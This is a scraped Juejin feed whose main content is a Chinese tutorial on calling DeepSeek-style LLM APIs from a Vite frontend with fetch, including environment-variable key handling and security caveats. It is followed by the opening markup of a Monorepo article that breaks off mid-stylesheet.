<h2 data-id="heading-12">✅ 五、总结：前端调用 LLM 的核心要点</h2>





































<table><thead><tr><th>要点</th><th>说明</th></tr></thead><tbody><tr><td>✅ 使用 <code>fetch</code> 发送 POST 请求</td><td>标准方式，兼容性强</td></tr><tr><td>✅ 设置 <code>Content-Type: application/json</code></td><td>必须</td></tr><tr><td>✅ 添加 <code>Authorization: Bearer &lt;key&gt;</code></td><td>认证必要</td></tr><tr><td>✅ 使用 <code>JSON.stringify()</code> 处理请求体</td><td>不能直接发送 JS 对象</td></tr><tr><td>✅ 使用 <code>await</code> 处理异步</td><td>更简洁</td></tr><tr><td>✅ 环境变量管理 API Key</td><td>Vite 支持 <code>VITE_</code> 开头变量</td></tr><tr><td>⚠️ 不要在生产环境中暴露 API Key</td><td>必须走后端代理</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-13">🎯 结语</h2>
<blockquote>
<p><strong>技术的本质是解决问题，而不是追求“高大上”的工具。</strong></p>
</blockquote>
<p>当你理解了 <code>fetch</code> 的工作原理，就能轻松对接任何符合 OpenAI 协议的 LLM 服务。无论是 DeepSeek、Qwen 还是其他模型，只要你知道它的 API 地址和参数格式，就可以用这段代码快速接入。</p>
<p>希望这篇文章帮你彻底搞懂了前端调用 LLM 的全过程！<br/>
如果你正在做项目，我可以帮你封装一个通用的 AI 调用模块 😊</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端调用大语言模型：基于 Vite 的工程化实践与 HTTP 请求详解]]></title>    <link>https://juejin.cn/post/7575090551357521972</link>    <guid>https://juejin.cn/post/7575090551357521972</guid>    <pubDate>2025-11-23T07:17:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357521972" data-draft-id="7575162322239881216" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 前端调用大语言模型：基于 Vite 的工程化实践与 HTTP 请求详解"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-11-23T07:17:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tzarevich"/> <meta itemprop="url" content="https://juejin.cn/user/578786070367529"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             前端调用大语言模型：基于 Vite 的工程化实践与 HTTP 请求详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578786070367529/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tzarevich
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:17:23.000Z" title="Sun Nov 23 2025 07:17:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前端调用大语言模型：基于 Vite 的工程化实践与 HTTP 请求详解</h2>
<p>随着人工智能技术的迅猛发展，大语言模型已逐渐从科研实验室走向工业应用。本文将围绕“前端如何以 HTTP 请求方式调用大语言模型”这一核心主题，结合现代前端工程化工具 Vite，详细讲解项目初始化、环境变量配置、fetch 请求封装、安全注意事项等关键环节，帮助读者掌握从前端发起 LLM 调用的全流程。</p>
<hr/>
<h3 data-id="heading-1">一、为什么前端可以直接调用 LLM？</h3>
<p>传统观点认为，AI 模型应由后端服务代理调用，前端仅负责展示结果。然而，在某些场景下，<strong>前端直连 LLM API 是可行且高效的</strong>，前提是：</p>
<ol>
<li><strong>API 支持 CORS（跨域资源共享）</strong> ：如 DeepSeek、OpenRouter 等部分服务商允许浏览器直接请求。</li>
<li><strong>安全性可控</strong>：通过短期有效的 API Key、IP 白名单、请求频率限制等方式降低风险。</li>
<li><strong>无需敏感数据处理</strong>：用户输入不涉及隐私或机密信息。</li>
</ol>
<p>以 DeepSeek 为例，其官方 API 支持 CORS，允许前端通过 <code>fetch</code> 直接发起 POST 请求，这为快速原型开发和轻量级应用提供了极大便利。</p>
<hr/>
<h3 data-id="heading-2">二、项目初始化：使用 Vite 搭建全栈友好型前端项目</h3>
<p>Vite 是新一代前端构建工具，以其极速的冷启动和热更新能力著称。虽然 Vite 本身是前端构建器，但其对环境变量、TypeScript、ESM 模块的原生支持，使其成为调用 LLM 的理想脚手架。</p>
<h4 data-id="heading-3">1. 创建项目</h4>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> vite<span class="hljs-variable">@latest</span> llm<span class="hljs-operator">-</span>frontend<span class="hljs-operator">-</span>demo <span class="hljs-comment">-- --template vanilla</span>
cd llm<span class="hljs-operator">-</span>frontend<span class="hljs-operator">-</span>demo
npm install
</code></pre>
<p>选择 <code>vanilla</code> 模板即可获得一个纯净的 HTML/CSS/JS 项目结构，适合教学和快速验证。</p>
<h4 data-id="heading-4">2. 配置环境变量</h4>
<p>出于安全考虑，<strong>API Key 绝不能硬编码在源码中</strong>。Vite 提供了 <code>.env</code> 文件机制，所有以 <code>VITE_</code> 开头的变量会被注入到客户端代码中。</p>
<p>创建 <code>.env.local</code> 文件（该文件通常加入 <code>.gitignore</code>，避免提交到版本控制）：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">VITE_DEEPSEEK_API_KEY</span>=sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</code></pre>
<blockquote>
<p>⚠️ 注意：此方法仅适用于 API 服务商允许前端直连的场景。若服务商禁止 CORS 或要求更高安全级别，则必须通过后端代理。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">三、HTTP 请求详解：如何正确调用 LLM API</h3>
<p>LLM API 通常遵循 RESTful 设计，使用 JSON 格式通信。以 DeepSeek 的 <code>/chat/completions</code> 接口为例，一次完整的请求包含三个部分：<strong>请求行、请求头、请求体</strong>。</p>
<h4 data-id="heading-6">1. 请求行（Request Line）</h4>
<ul>
<li><strong>Method</strong>: <code>POST</code>（因为需要发送消息内容）</li>
<li><strong>URL</strong>: <code>https://api.deepseek.com/chat/completions</code></li>
<li><strong>HTTP 版本</strong>: 通常由浏览器自动处理，无需显式指定</li>
</ul>
<h4 data-id="heading-7">2. 请求头（Headers）</h4>
<p>必须包含两个关键字段：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> headers = {
  <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
  <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${<span class="hljs-keyword">import</span>.meta.env.VITE_DEEPSEEK_API_KEY}</span>`</span>
};
</code></pre>
<ul>
<li><code>Content-Type: application/json</code> 告知服务器请求体为 JSON 格式。</li>
<li><code>Authorization: Bearer &lt;token&gt;</code> 是 OAuth 2.0 标准的认证方式，<code>Bearer</code> 为固定前缀。</li>
</ul>
<h4 data-id="heading-8">3. 请求体（Body）</h4>
<p>LLM 接口通常要求结构化的消息数组：</p>
<pre><code class="hljs language-css" lang="css">const payload = {
  model: <span class="hljs-string">'deepseek-chat'</span>, // 指定模型名称
  messages: [
    { role: <span class="hljs-string">"system"</span>, content: <span class="hljs-string">"You are a helpful assistant."</span> },
    { role: <span class="hljs-string">"user"</span>, content: <span class="hljs-string">"你好 DeepSeek"</span> }
  ]
};
</code></pre>
<p>注意：<strong>body 必须是字符串</strong>，不能直接传入 JavaScript 对象。需使用 <code>JSON.stringify()</code> 序列化：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span>: JSON.<span class="hljs-built_in">stringify</span>(payload)
</code></pre>
<h5 data-id="heading-9">为什么 body 必须是字符串？</h5>
<p>这是因为 <strong><code>fetch</code> API 的底层实现遵循 HTTP 协议规范</strong>，而 HTTP 协议规定：<strong>请求体（request body）只能是字节流（即二进制数据）</strong> 。在浏览器环境中，JavaScript 无法直接发送对象、数组等高级数据结构——这些结构只存在于运行时内存中，网络传输必须将其转换为可序列化的格式。</p>
<p>当你调用 <code>fetch</code> 并设置 <code>body</code> 字段时，浏览器期望你提供以下几种类型之一：</p>
<ul>
<li><code>string</code>（如 JSON 字符串）</li>
<li><code>FormData</code></li>
<li><code>URLSearchParams</code></li>
<li><code>Blob</code> / <code>ArrayBuffer</code> / <code>ReadableStream</code> 等二进制类型</li>
</ul>
<p>如果你直接传入一个 JavaScript 对象（例如 <code>{ key: "value" }</code>），浏览器会尝试将其隐式转换为字符串，结果通常是 <code>[object Object]</code> —— 这显然不是服务器期望的 JSON 格式，会导致 API 返回解析错误（如 400 Bad Request）。</p>
<p>因此，<strong>必须显式使用 <code>JSON.stringify()</code> 将对象转换为标准的 JSON 字符串</strong>，确保服务端能正确反序列化并理解你的请求内容。同时，配合设置请求头 <code>'Content-Type': 'application/json'</code>，告知服务器：“我发送的是 JSON 格式的文本”。</p>
<blockquote>
<p>✅ 正确做法：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span>: JSON.<span class="hljs-built_in">stringify</span>({ message: <span class="hljs-string">"hello"</span> })
</code></pre>
<p>❌ 错误做法：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span>: { message: <span class="hljs-string">"hello"</span> }  // 实际发送的是 "<span class="hljs-selector-attr">[object Object]</span>"
</code></pre>
</blockquote>
<p>这一细节看似微小，却是前后端数据通信可靠性的关键保障。</p>
<h3 data-id="heading-10">四、使用 fetch 发起异步请求</h3>
<p>现代浏览器原生支持 <code>fetch</code> API，它是发起 HTTP 请求的标准方式。</p>
<h4 data-id="heading-11">完整调用示例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">const</span> endpoint = <span class="hljs-string">'https://api.deepseek.com/chat/completions'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">callDeepSeek</span>(<span class="hljs-params">userMessage</span>) {
  <span class="hljs-keyword">const</span> headers = {
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
    <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${<span class="hljs-keyword">import</span>.meta.env.VITE_DEEPSEEK_API_KEY}</span>`</span>
  };

  <span class="hljs-keyword">const</span> payload = {
    <span class="hljs-attr">model</span>: <span class="hljs-string">'deepseek-chat'</span>,
    <span class="hljs-attr">messages</span>: [
      { <span class="hljs-attr">role</span>: <span class="hljs-string">"system"</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">"You are a helpful assistant."</span> },
      { <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>, <span class="hljs-attr">content</span>: userMessage }
    ]
  };

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(endpoint, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      headers,
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)
    });

    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP error! status: <span class="hljs-subst">${response.status}</span>`</span>);
    }

    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
    <span class="hljs-keyword">return</span> data.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>;
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'调用 DeepSeek 失败:'</span>, error);
    <span class="hljs-keyword">return</span> <span class="hljs-string">'抱歉，暂时无法获取回复。'</span>;
  }
}

<span class="hljs-comment">// 绑定按钮点击事件</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'send-btn'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'user-input'</span>);
  <span class="hljs-keyword">const</span> replyEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'reply'</span>);

  <span class="hljs-keyword">const</span> userMsg = input.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
  <span class="hljs-keyword">if</span> (!userMsg) <span class="hljs-keyword">return</span>;

  replyEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">'思考中...'</span>;
  <span class="hljs-keyword">const</span> reply = <span class="hljs-keyword">await</span> <span class="hljs-title function_">callDeepSeek</span>(userMsg);
  replyEl.<span class="hljs-property">textContent</span> = reply;
  input.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
});
</code></pre>
<h4 data-id="heading-12">关键点说明</h4>
<ul>
<li>使用 <code>async/await</code> 使异步代码更易读，避免回调地狱。</li>
<li>对 <code>response.ok</code> 进行判断，防止非 2xx 响应被误认为成功。</li>
<li>错误处理必不可少，网络波动或配额耗尽可能导致请求失败。</li>
</ul>
<hr/>
<h3 data-id="heading-13">五、工程化思维：代码如钢筋水泥</h3>
<p>在 Trae 所倡导的“工程化”理念中，代码不仅是功能的载体，更是可维护、可扩展、可协作的“建筑材料”。调用 LLM 不应只是复制粘贴一段 fetch 代码，而应思考：</p>
<ul>
<li><strong>可复用性</strong>：将 LLM 调用封装为独立函数或模块。</li>
<li><strong>可配置性</strong>：模型名称、系统提示词可通过参数传入。</li>
<li><strong>可测试性</strong>：模拟 API 响应进行单元测试。</li>
<li><strong>用户体验</strong>：加载状态、错误提示、输入限制等细节。</li>
</ul>
<p>例如，可进一步抽象为：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LLMClient</span> {
  <span class="hljs-keyword">constructor</span>(apiKey, model = <span class="hljs-string">'deepseek-chat'</span>) {
    <span class="hljs-keyword">this</span>.apiKey = apiKey;
    <span class="hljs-keyword">this</span>.model = model;
    <span class="hljs-keyword">this</span>.endpoint = <span class="hljs-string">'https://api.deepseek.com/chat/completions'</span>;
  }

  async chat(messages, systemPrompt = <span class="hljs-string">"You are a helpful assistant."</span>) {
    <span class="hljs-keyword">const</span> fullMessages = [
      { role: <span class="hljs-string">"system"</span>, content: systemPrompt },
      ...messages
    ];

    <span class="hljs-keyword">const</span> response = await fetch(<span class="hljs-keyword">this</span>.endpoint, {
      method: <span class="hljs-string">'POST'</span>,
      headers: {
        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
        <span class="hljs-string">'Authorization'</span>: `Bearer ${<span class="hljs-keyword">this</span>.apiKey}`
      },
      body: JSON.stringify({ model: <span class="hljs-keyword">this</span>.model, messages: fullMessages })
    });

    <span class="hljs-keyword">const</span> <span class="hljs-keyword">data</span> = await response.json();
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>.choices[<span class="hljs-number">0</span>].message.content;
  }
}
</code></pre>
<p>这种面向对象的设计更利于大型项目集成。</p>
<hr/>
<h3 data-id="heading-14">六、安全与最佳实践</h3>
<p>尽管前端直连 LLM 便捷高效，但也存在风险：</p>
<ol>
<li>
<p><strong>API Key 泄露</strong>：一旦 <code>.env</code> 中的 Key 被提取，可能被滥用产生高额费用。</p>
<ul>
<li>解决方案：使用短期 Token、设置 IP 白名单、监控调用量。</li>
</ul>
</li>
<li>
<p><strong>CORS 限制</strong>：并非所有 LLM 服务商都开放 CORS。</p>
<ul>
<li>替代方案：通过 Vite 的代理功能（仅开发环境）或部署轻量后端（如 Cloudflare Workers）中转。</li>
</ul>
</li>
<li>
<p><strong>速率限制</strong>：频繁请求可能触发限流。</p>
<ul>
<li>建议：添加防抖、队列机制或用户提示。</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-15">结语</h3>
<p>前端调用大语言模型不再是遥不可及的概念，而是触手可及的工程实践。借助 Vite 的现代化开发体验和浏览器原生的 <code>fetch</code> 能力，我们可以快速构建具备 AI 能力的 Web 应用。然而，技术便利的背后是对工程规范、安全意识和用户体验的更高要求。</p>
<p>未来，随着 WebAssembly、WebGPU 等技术的发展，甚至可能在浏览器本地运行小型 LLM，实现完全离线的智能交互。但无论技术如何演进，“工程化”始终是高质量软件开发的基石——正如钢筋水泥之于摩天大楼，代码结构之于数字世界。</p>
<blockquote>
<p><strong>代码不是魔法，而是精心设计的工程。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Monorepo 架构全解析：从概念到落地的完整指南]]></title>    <link>https://juejin.cn/post/7575807729722392610</link>    <guid>https://juejin.cn/post/7575807729722392610</guid>    <pubDate>2025-11-23T08:06:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575807729722392610" data-draft-id="7575807729722228770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Monorepo 架构全解析：从概念到落地的完整指南"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T08:06:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Wect"/> <meta itemprop="url" content="https://juejin.cn/user/4185164878720068"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Monorepo 架构全解析：从概念到落地的完整指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185164878720068/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Wect
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:06:51.000Z" title="Sun Nov 23 2025 08:06:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZ